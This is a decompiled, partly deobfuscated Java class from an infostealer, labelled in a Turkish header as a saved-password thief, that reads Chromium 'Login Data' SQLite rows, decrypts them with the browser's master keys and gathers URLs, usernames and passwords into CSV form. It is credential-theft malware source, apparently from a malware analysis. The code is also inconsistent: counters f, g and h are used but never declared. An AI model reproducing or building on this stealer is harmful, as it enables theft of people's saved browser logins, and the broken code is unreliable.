/*\n * ========================================\n * DEOBFUSCATED: PasswordStealer.java\n * Original: c/n.java\n * ----------------------------------------\n * Kayıtlı şifre hırsızı - Login Data SQLite den kullanıcı adı/şifre çalar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.f;
import c.g$MasterKeys;
import c.j;
import c.n$Login;
import c.r;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class n
extends j {
    public static final String CSV_HEADER = "Browser,URL,Username,Password,Creation Date,Last Use Date\n";
    private final List<n$Login> e = new ArrayList<n$Login>();
    private static int totalPasswords;
    private static int decryptedPasswords;
    private static int failedPasswords;
    private static int i;
    private static int j;
    private static int k;

    public static void resetDebugStats() {
        k = 0;
        j = 0;
        i = 0;
        h = 0;
        g = 0;
        f = 0;
    }

    public static String debugSummary() {
        return "rows=" + f + " v10=" + g + " v20=" + h + " other=" + i + " decrypted=" + j + " empty=" + k;
    }

    private static boolean looksLikeCipherDump(String string) {
        if (string == null || string.length() < 3) {
            return false;
        }
        char c2 = string.charAt(0);
        char c3 = string.charAt(1);
        char c4 = string.charAt(2);
        if (!(c2 != 'v' && c2 != 'V' && c2 != 'a' && c2 != 'A' || c3 != '1' || c4 != '0' && c4 != '1')) {
            return true;
        }
        return c2 == 'v' && c3 == '2' && c4 == '0';
    }

    private static void trackDecrypt(byte[] byArray, String string) {
        ++f;
        if (byArray != null && byArray.length >= 3 && byArray[0] == 118) {
            if (byArray[1] == 50 && byArray[2] == 48) {
                ++h;
            } else if (byArray[1] == 49 && (byArray[2] == 48 || byArray[2] == 49)) {
                ++g;
            } else {
                ++i;
            }
        } else {
            ++i;
        }
        if (string != null && !string.trim().isEmpty()) {
            ++j;
        } else {
            ++k;
        }
    }

    public n(f f2) {
        super(f2, "Login Data" /* r.ld() */, "logins" /* r.lg() */);
        this.findResultSets();
    }

    @Override
    public String toCsvColumn() {
        return super.toCsvColumn(this.e);
    }

    @Override
    public void onResultSetFound(ResultSet resultSet) {
        try {
            g$MasterKeys g$MasterKeys = this.getProfile().getBrowser().getMasterKeys();
            this.e.add(new n$Login(resultSet, g$MasterKeys, this.getProfile().getBrowser().getInfo()));
        }
        catch (SQLException sQLException) {
            // empty catch block
        }
    }

    public int getCount() {
        return this.e.size();
    }

    public List<n$Login> getLogins() {
        return this.e;
    }
}

